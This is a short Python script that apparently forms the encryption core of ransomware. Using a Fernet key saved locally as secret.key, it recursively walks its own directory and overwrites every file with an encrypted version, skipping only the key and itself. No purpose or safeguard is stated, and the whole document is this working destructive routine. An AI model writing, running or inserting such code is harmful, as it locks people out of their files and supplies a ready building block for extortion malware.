import os
from cryptography.fernet import Fernet

# Generate or load encryption key
def get_or_create_key():
    key_file = "secret.key"
    if not os.path.exists(key_file):
        key = Fernet.generate_key()
        with open(key_file, "wb") as f:
            f.write(key)
        print("[+] Key generated and saved to secret.key")
    else:
        print("[+] Key loaded from secret.key")
    return open(key_file, "rb").read()

# Encrypt a single file
def encrypt_file(file_path, fernet):
    with open(file_path, "rb") as f:
        data = f.read()
    encrypted = fernet.encrypt(data)
    with open(file_path, "wb") as f:
        f.write(encrypted)
    print(f"[+] Encrypted: {file_path}")

# Encrypt all files in current directory and subdirectories
def encrypt_directory(base_path, fernet):
    for root, _, files in os.walk(base_path):
        for filename in files:
            # Skip the key and script itself
            if filename in ("secret.key", os.path.basename(__file__)):
                continue
            file_path = os.path.join(root, filename)
            try:
                encrypt_file(file_path, fernet)
            except Exception as e:
                print(f"[!] Skipped {file_path}: {e}")

if __name__ == "__main__":
    current_dir = os.path.dirname(os.path.abspath(__file__))
    key = get_or_create_key()
    fernet = Fernet(key)
    encrypt_directory(current_dir, fernet)
    print("\n[✓] Encryption complete.")
